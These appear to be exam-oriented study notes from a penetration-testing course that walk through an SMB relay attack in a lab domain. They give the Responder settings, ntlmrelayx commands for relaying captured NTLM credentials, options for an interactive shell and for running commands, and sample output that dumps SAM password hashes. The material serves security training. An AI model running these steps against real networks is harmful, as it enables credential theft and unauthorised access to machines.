---

---

# 🛡️ SMB Relay Attack

---

## 📋 Summary

**SMB Relay Attacks** exploit NTLM hash captures (e.g., through Responder) to relay credentials to other machines without cracking them. This attack is feasible if **SMB signing** is disabled or not enforced on the target machine. **SMB (Server Message Block)** is primarily used for **file sharing** but also facilitates remote command execution. Captured credentials (e.g., from **Punisher**) are relayed to another machine (e.g., **Spiderman**) using **ntlmrelayx**.

### 📝 Key Points

- **SMB signing** must be **disabled or not enforced** on the target machine.
- Captured credentials need **admin privileges** on the target to execute commands.
- The attack involves:
    1. Identifying vulnerable machines.
    2. Modifying Responder to capture hashes.
    3. Using `ntlmrelayx` to relay credentials to the target.

---

## 📚 Detailed Notes

### 1. **Requirements**

- **SMB signing** must be **disabled/not enforced** on the target.
- The captured credentials must have **admin privileges** on the target machine.

💡 **Tip**: Workstations often have SMB signing disabled, while servers usually have it enabled.

---

### 2. **Identify Hosts Without SMB Signing**

- **Nmap Command**:**Output**:
    
    ```bash
    nmap --script=smb2-security-mode.nse -p445 192.168.164.139 -Pn
    
    ```
    
    ```
    Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2024-09-28 14:03 EDT
    Nmap scan report for 192.168.164.139
    Host is up (0.0010s latency).
    
    PORT    STATE SERVICE
    445/tcp open  microsoft-ds
    
    Host script results:
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled but not required
    
    ```
    
    - **Significance**: The line **"Message signing enabled but not required"** indicates that the target is vulnerable to SMB relay attacks, as it does not enforce SMB signing.

---

### 3. **Modify Responder Configuration**

- Edit the Responder config file:
    
    ```bash
    sudo mousepad /etc/responder/Responder.conf
    
    ```
    
- Disable **SMB** and **HTTP** services to enable hash relaying instead of just capturing.

---

### 4. **Run Responder**

- Start Responder on the attacking machine:
    
    ```bash
    sudo responder -I tun0 -wPv
    
    ```
    
- Ensure **LLMNR** and **NBT-NS** poisoners are ON, while **SMB** and **HTTP** servers are OFF.

---

### 5. **Set Up SMB Relay with ntlmrelayx**

- Create a file (`targets.txt`) containing the IP addresses of machines with SMB signing disabled:
    
    ```bash
    cat targets.txt
    192.168.164.139
    192.168.164.140
    
    ```
    
- Run `ntlmrelayx` to relay captured hashes:
    
    ```bash
    sudo ntlmrelayx.py -tf targets.txt -smb2support
    
    ```
    

---

### 6. **Significance of ntlmrelayx Output**

**Sample Output**:

```
[*] SMBD-Thread-3: Received connection from 192.168.164.139, attacking target smb://192.168.164.140
[*] Authenticating against smb://192.168.164.140 as MARVEL\\fcastle SUCCEED
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

- **Key Indicators**:
    - **Received connection**: Indicates a captured connection from the target machine (e.g., `192.168.164.139`).
    - **Authenticating against...SUCCEED**: Confirms that the credentials have been successfully relayed and authenticated on the target machine (`192.168.164.140`).
    - **Dumping local SAM hashes**: Shows successful extraction of **SAM hashes** from the target, which can be used for further exploitation (e.g., password cracking).

---

### 7. **Optional Interactive Shell**

- Run `ntlmrelayx` to get an interactive SMB shell:
    
    ```bash
    sudo ntlmrelayx.py -tf targets.txt -smb2support -i
    
    ```
    
- To bind to the shell:
    
    ```bash
    nc 127.0.0.1 11000
    
    ```
    

---

### 8. **Executing Commands**

- To execute a command on the target:
    
    ```bash
    sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
    
    ```
    

---

### 9. **Lab Example (Dumping SAM Hashes)**

- **Nmap Scan**:
    
    ```bash
    nmap --script=smb2-security-mode.nse -p445 192.168.164.140 -Pn
    
    ```
    
    - **Response**: "Message signing enabled but not required."
- **Run Responder**:
    
    ```bash
    sudo responder -I eth0 -dPv
    
    ```
    
- **Relay Hashes**:
    
    ```bash
    ntlmrelayx.py -tf targets.txt -smb2support
    
    ```
    
- **Dump SAM Hashes**:
    
    ```bash
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
    
    ```
    

---

## 📖 Abbreviations & Definitions

- **SMB**: Server Message Block – A protocol for file sharing and remote access on Windows networks.
- **NTLM**: NT LAN Manager – A Microsoft suite of security protocols for authentication.
- **LLMNR**: Link-Local Multicast Name Resolution – Resolves hostnames in local networks.
- **NBT-NS**: NetBIOS Name Service – A legacy method for name resolution.
- **SAM**: Security Account Manager – A Windows database that stores user credentials.
- **Relay**: Passing captured credentials to another target for authentication.

---

## 🚨 Critical Mentions & Exam Traps

- 🚨 **SMB Signing Check**: Always confirm if SMB signing is disabled or not enforced on the target. If **enabled and required**, the relay attack **won't work**.
- 🚨 **No Self-Relay**: You **cannot relay credentials** back to the originating machine.
- 💡 **Important Commands**:
    - `nmap --script=smb2-security-mode.nse -p445 -Pn`
    - `ntlmrelayx.py -tf targets.txt -smb2support`
- 📝 **Key Output**:
    - Look for **"Authenticating...SUCCEED"** in `ntlmrelayx` output, indicating a successful relay.
    - **Dumping SAM hashes**: Shows that you have compromised the target.
- 📝 **Subtle Details**:
    - Disable **SMB** and **HTTP** in Responder for a successful relay.
    - Use the **interactive shell (-i)** in `ntlmrelayx` for direct access to the target.

---

## 🧠 Tips for Exam Success

- **Create a target file** (`targets.txt`) listing vulnerable machines.
- Always **monitor Responder output** to identify when hashes are captured.
- Confirm **SMB signing status** using Nmap before proceeding with the attack.

---